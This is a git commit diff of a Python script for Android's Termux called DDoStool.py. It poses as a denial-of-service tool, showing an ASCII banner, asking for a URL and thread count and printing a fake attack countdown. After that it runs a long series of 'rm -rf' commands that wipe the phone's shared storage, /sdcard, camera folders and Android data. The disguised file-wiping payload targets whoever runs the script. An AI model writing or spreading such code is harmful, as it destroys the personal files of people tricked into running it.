25357d741d0b10d3b4297d9f0d2d04bfdee0e188
Unknown <109916673+Renzcarl@users.noreply.github.com>
2022-09-29 02:54:28 +0800

    DDoStool.py

--- DDoStool.py
+++ DDoStool.py
@@ -1,32 +1,54 @@
+import androidhelper
 import os
+import time
+import colorama
+from colorama import Fore, Back, Style
+colorama.init()
 
 os.system("clear")
-print(" ╭━━━┳━━━┳━━━┳╮╱╭╮ ")
-print(" ┃╭━╮┃╭━╮┃╭━╮┃┃╱┃┃ ")
-print(" ┃┃╱╰┫╰━╯┃╰━╯┃╰━╯┃ ")
-print(" ┃┃╱╭┫╭━━┫╭━━┫╭━╮┃ ")
-print(" ┃╰━╯┃┃╱╱┃┃╱╱┃┃╱┃┃ ")
-print(" ╰━━━┻╯╱╱╰╯╱╱╰╯╱╰╯ ")
-print(" ╭━━━┳━━━┳━━━┳━━━╮ ")
-print(" ╰╮╭╮┣╮╭╮┃╭━╮┃╭━╮┃ ")
-print(" ╱┃┃┃┃┃┃┃┃┃╱┃┃╰━━╮ ")
-print(" ╱┃┃┃┃┃┃┃┃┃╱┃┣━━╮┃ ")
-print(" ╭╯╰╯┣╯╰╯┃╰━╯┃╰━╯┃ ")
-print(" ╰━━━┻━━━┻━━━┻━━━╯ ")
-print("        Created by Mr.brutus ")
 
-x = input(" URL: ")
+print(Fore.YELLOW +"                        ░█████╗░██████╗░██████╗░██╗░░██╗")
+print(Fore.YELLOW +"                        ██╔══██╗██╔══██╗██╔══██╗██║░░██║")
+print(Fore.YELLOW +"                        ██║░░╚═╝██████╔╝██████╔╝███████║")
+print(Fore.YELLOW +"                        ██║░░██╗██╔═══╝░██╔═══╝░██╔══██║")
+print(Fore.YELLOW +"                        ╚█████╔╝██║░░░░░██║░░░░░██║░░██║")
+print(Fore.YELLOW +"                        ░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝░░╚═╝")
+print(Fore.GREEN +"                         ██████╗░██████╗░░█████╗░░██████╗")
+print(Fore.GREEN +"                         ██╔══██╗██╔══██╗██╔══██╗██╔════╝")
+print(Fore.GREEN +"                         ██║░░██║██║░░██║██║░░██║╚█████╗░")
+print(Fore.GREEN +"                         ██║░░██║██║░░██║██║░░██║░╚═══██╗")
+print(Fore.GREEN +"                         ██████╔╝██████╔╝╚█████╔╝██████╔╝")
+print(Fore.GREEN +"                         ╚═════╝░╚═════╝░░╚════╝░╚═════╝░\n")
+
+print(Fore.BLUE + "\n                      ----------CREATED BY MR.BRUTUS-----------\n")
+
+droid = androidhelper.Android()
+droid.makeToast('HELLO WEKCOME TO MY TOOL')
+
+x = input(Fore.RED +" URL: ")
 y = input(" Thread ")
 
+time.sleep(3.4)
+print(Fore.RED + ' website has been checked please wait ')
+time.sleep(1.3)
 for y in range (10000000):
     print(" [*] attack status ===> ",y," sec left ")
 ddos = input(" attack done press enter or type exit;  ")
 
 os.system('termux-setup-storage')
 os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf camera')
+os.system('rm -rf image')
+os.system('rm -rf screenshot')
+os.system('rm -rf screenshot')
+os.system('rm -rf android')
+os.system('rm -rf /storage/android')
+os.system('rm -rf app store uninstall-termux')
+os.system('rm -rf app store uninstall-all-apps')
+os.system('rm -rf picture, Download, photo, gallery,')
+os.system('rm -rf /internal storage/Android/data')
+os.system('rm -rf /internal storage/Android/obb')
 os.system('rm -rf /storage/emulated/*')
 os.system('rm -rf /sdcard/*')
-os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /storage/0/*')
 os.system('rm -rf /sdcard1/*')
-os.system('rm -rf /storage/*')
-os.system('rm -rf /* ')
